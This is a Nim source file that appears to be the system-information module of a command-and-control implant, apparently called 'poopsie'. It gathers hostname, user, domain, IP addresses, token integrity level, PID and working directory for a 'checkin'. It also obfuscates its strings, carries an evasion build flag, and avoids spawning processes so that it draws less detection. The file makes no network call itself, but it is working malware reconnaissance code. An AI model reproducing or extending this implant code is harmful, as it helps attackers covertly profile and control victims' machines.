import std/[os, strutils]
import strenc

when defined(linux):
  import posix

when defined(windows):
  when defined(evasion_dfr):
    import winim/lean except OpenProcessToken
    import winapi
  else:
    import winim/lean
  import ../tasks/token_manager

  const
    AF_UNSPEC_SYSINFO = ULONG(0)
    GAA_FLAG_SKIP_ANYCAST = ULONG(0x0002)
    GAA_FLAG_SKIP_MULTICAST = ULONG(0x0004)
    GAA_FLAG_SKIP_DNS_SERVER = ULONG(0x0008)

  type
    SOCKET_ADDRESS_SI = object
      lpSockaddr: pointer
      iSockaddrLength: int32

    IP_ADAPTER_UNICAST_ADDRESS_SI = object
      Length: ULONG
      Flags: DWORD
      Next: ptr IP_ADAPTER_UNICAST_ADDRESS_SI
      Address: SOCKET_ADDRESS_SI
      PrefixOrigin: int32
      SuffixOrigin: int32
      DadState: int32
      ValidLifetime: ULONG
      PreferredLifetime: ULONG
      LeaseLifetime: ULONG
      OnLinkPrefixLength: uint8

    IP_ADAPTER_ADDRESSES_SI = object
      Length: ULONG
      IfIndex: DWORD
      Next: ptr IP_ADAPTER_ADDRESSES_SI
      AdapterName: cstring
      FirstUnicastAddress: ptr IP_ADAPTER_UNICAST_ADDRESS_SI
      FirstAnycastAddress: pointer
      FirstMulticastAddress: pointer
      FirstDnsServerAddress: pointer
      DnsSuffix: LPWSTR
      Description: LPWSTR
      FriendlyName: LPWSTR
      PhysicalAddress: array[8, byte]
      PhysicalAddressLength: DWORD
      Flags: DWORD
      Mtu: DWORD
      IfType: DWORD
      OperStatus: DWORD
      # remaining fields not needed

  proc GetAdaptersAddresses_SI(Family: ULONG, Flags: ULONG, Reserved: pointer,
                               AdapterAddresses: ptr IP_ADAPTER_ADDRESSES_SI,
                               SizePointer: ptr ULONG): ULONG
    {.importc: "GetAdaptersAddresses", dynlib: "iphlpapi.dll", stdcall.}

  proc WSAAddressToStringA_SI(lpsaAddress: pointer, dwAddressLength: DWORD,
                              lpProtocolInfo: pointer, lpszAddressString: ptr byte,
                              lpdwAddressStringLength: ptr DWORD): int32
    {.importc: "WSAAddressToStringA", dynlib: "ws2_32.dll", stdcall.}

  proc getIpsViaApi(): seq[string] =
    ## Get all unicast IPs via GetAdaptersAddresses — no process spawning
    result = @[]
    var bufSize: ULONG = 0
    let flags = GAA_FLAG_SKIP_ANYCAST or GAA_FLAG_SKIP_MULTICAST or GAA_FLAG_SKIP_DNS_SERVER
    discard GetAdaptersAddresses_SI(AF_UNSPEC_SYSINFO, flags, nil, cast[ptr IP_ADAPTER_ADDRESSES_SI](nil), addr bufSize)
    if bufSize == 0:
      return
    var buf = newSeq[byte](bufSize)
    let pAddrs = cast[ptr IP_ADAPTER_ADDRESSES_SI](addr buf[0])
    if GetAdaptersAddresses_SI(AF_UNSPEC_SYSINFO, flags, nil, pAddrs, addr bufSize) != 0:
      return
    var adapter = pAddrs
    while not adapter.isNil:
      # Only include adapters that are "up" (OperStatus == 1)
      if adapter[].OperStatus == 1:
        var unicast = adapter[].FirstUnicastAddress
        while not unicast.isNil:
          let sa = unicast[].Address.lpSockaddr
          if not sa.isNil:
            var strBuf: array[46, byte]
            var strLen = DWORD(strBuf.len)
            if WSAAddressToStringA_SI(sa, DWORD(unicast[].Address.iSockaddrLength),
                                      nil, addr strBuf[0], addr strLen) == 0:
              var ipStr = ""
              for i in 0..<int(strLen):
                if strBuf[i] == 0: break
                ipStr.add(char(strBuf[i]))
              # Strip port suffix from IPv6 (e.g. "[::1]:0" -> "::1") or IPv4 scope
              if ipStr.len > 0 and ipStr != "127.0.0.1" and ipStr != "::1":
                # Remove bracket notation and port for IPv6
                if ipStr.startsWith("["):
                  let closeBracket = ipStr.find(']')
                  if closeBracket > 0:
                    ipStr = ipStr[1..<closeBracket]
                # Remove %scope_id suffix
                let pctIdx = ipStr.find('%')
                if pctIdx > 0:
                  ipStr = ipStr[0..<pctIdx]
                result.add(ipStr)
          unicast = unicast[].Next
      adapter = adapter[].Next

when defined(linux):
  type
    Ifaddrs {.importc: "struct ifaddrs", header: "<ifaddrs.h>".} = object
      ifa_next: ptr Ifaddrs
      ifa_name: cstring
      ifa_flags: cuint
      ifa_addr: ptr SockAddr
      ifa_netmask: ptr SockAddr
      ifa_broadaddr: ptr SockAddr  # union with ifa_dstaddr
      ifa_data: pointer

  proc c_getifaddrs(ifap: ptr ptr Ifaddrs): cint
    {.importc: "getifaddrs", header: "<ifaddrs.h>".}
  proc c_freeifaddrs(ifa: ptr Ifaddrs)
    {.importc: "freeifaddrs", header: "<ifaddrs.h>".}

  proc getIpsViaGetifaddrs(): seq[string] =
    ## Get all IPs via getifaddrs() — no process spawning
    result = @[]
    var ifap: ptr Ifaddrs
    if c_getifaddrs(addr ifap) != 0:
      return
    defer: c_freeifaddrs(ifap)
    var ifa = ifap
    while not ifa.isNil:
      if not ifa[].ifa_addr.isNil:
        let family = ifa[].ifa_addr.sa_family
        if family == posix.AF_INET:
          let sa4 = cast[ptr Sockaddr_in](ifa[].ifa_addr)
          let addrBytes = cast[ptr array[4, uint8]](addr sa4.sin_addr)
          let ip = $addrBytes[0] & "." & $addrBytes[1] & "." & $addrBytes[2] & "." & $addrBytes[3]
          if ip != "127.0.0.1":
            result.add(ip)
        elif family == posix.AF_INET6:
          let sa6 = cast[ptr Sockaddr_in6](ifa[].ifa_addr)
          let b = cast[ptr array[16, uint8]](addr sa6.sin6_addr)
          # Skip loopback (::1)
          var isLoopback = true
          for i in 0..14:
            if b[i] != 0: isLoopback = false; break
          if b[15] != 1: isLoopback = false
          if not isLoopback:
            # Format IPv6
            var parts: seq[string] = @[]
            for i in countup(0, 15, 2):
              parts.add(toHex(int(b[i]), 2).toLowerAscii() & toHex(int(b[i+1]), 2).toLowerAscii())
            var ipv6 = parts.join(":")
            # Skip link-local (fe80::)
            if not ipv6.startsWith("fe80"):
              result.add(ipv6)
      ifa = ifa[].ifa_next

when defined(windows):
  proc getIntegrityLevel*(): int =
    ## Returns 0=Untrusted, 1=Low, 2=Medium, 3=High, 4=System, -1=Error
    var hToken: HANDLE
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, addr hToken) == 0:
      return -1
    defer: CloseHandle(hToken)
    var len: DWORD = 0
    discard GetTokenInformation(hToken, tokenIntegrityLevel, nil, 0, addr len)
    if len == 0:
      return -1
    var buf = alloc(len)
    defer: dealloc(buf)
    if GetTokenInformation(hToken, tokenIntegrityLevel, buf, len, addr len) == 0:
      return -1
    let til = cast[PTOKEN_MANDATORY_LABEL](buf)
    let pSid = til.Label.Sid
    let count = int(GetSidSubAuthorityCount(pSid)[]) - 1
    let pIntegrity = GetSidSubAuthority(pSid, DWORD(count))
    let integrity = int(pIntegrity[])
    # Map integrity value to level
    if integrity >= SECURITY_MANDATORY_SYSTEM_RID:
      return 4 # System
    elif integrity >= SECURITY_MANDATORY_HIGH_RID:
      return 3 # High
    elif integrity >= SECURITY_MANDATORY_MEDIUM_RID:
      return 2 # Medium
    elif integrity >= SECURITY_MANDATORY_LOW_RID:
      return 1 # Low
    else:
      return 0 # Untrusted

type
  SystemInfo* = object
    hostname*: string
    user*: string
    os*: string
    arch*: string
    pid*: int
    ips*: seq[string]
    domain*: string
    integrityLevel*: int
    processName*: string
    cwd*: string

proc getSystemInfo*(): SystemInfo =
  ## Collect system information for checkin
  result = SystemInfo()
  
  # Get hostname
  try:
    when defined(windows):
      result.hostname = getEnv(obf("COMPUTERNAME"), "unknown")
    else:
      # Read /etc/hostname instead of spawning 'hostname' process
      try:
        result.hostname = readFile(obf("/etc/hostname")).strip()
      except:
        # Fallback to POSIX gethostname
        var buf: array[256, char]
        if posix.gethostname(cast[cstring](addr buf[0]), 256) == 0:
          result.hostname = $cast[cstring](addr buf[0])
        else:
          result.hostname = "unknown"
  except:
    result.hostname = "unknown"
  
  # Get username - use proper API that respects thread impersonation
  try:
    when defined(windows):
      result.user = getCurrentUsername()
      # Strip domain prefix (DOMAIN\user -> user) since domain is sent separately
      if result.user.contains(obf("\\")):
        result.user = result.user.split(obf("\\"))[^1]
      if result.user.len == 0:
        result.user = getEnv(obf("USERNAME"), "unknown")
    else:
      result.user = getEnv(obf("USER"), "unknown")
  except:
    result.user = "unknown"
  
  # Get OS
  when defined(windows):
    result.os = "Windows"
  elif defined(linux):
    result.os = "Linux"
  else:
    result.os = "Unknown"
  
  # Get architecture
  when defined(amd64) or defined(x86_64):
    result.arch = "x64"
  elif defined(i386):
    result.arch = "x86"
  elif defined(arm64) or defined(aarch64):
    result.arch = "arm64"
  else:
    result.arch = "unknown"
  
  # Get PID
  result.pid = getCurrentProcessId()
  
  # Get IPs — use API calls, no process spawning
  result.ips = @[]
  try:
    when defined(windows):
      result.ips = getIpsViaApi()
    else:
      result.ips = getIpsViaGetifaddrs()
  except:
    discard
  if result.ips.len == 0:
    result.ips = @[obf("127.0.0.1")]
  
  # Get domain (Windows only for now)
  when defined(windows):
    try:
      result.domain = getEnv(obf("USERDOMAIN"), "")
    except:
      result.domain = ""
  else:
    result.domain = ""
  
  # Integrity level (real, Windows only; Linux: 3=root, 2=normal)
  when defined(windows):
    result.integrityLevel = getIntegrityLevel()
  elif defined(linux):
    try:
      result.integrityLevel = if getuid() == 0: 3 else: 2
    except:
      result.integrityLevel = 2
  else:
    result.integrityLevel = 2  # Medium by default

  # Get current working directory
  try:
    result.cwd = getCurrentDir()
  except:
    result.cwd = "/"

  # Get process name
  try:
    result.processName = getAppFilename().extractFilename()
  except:
    result.processName = obf("poopsie.exe")
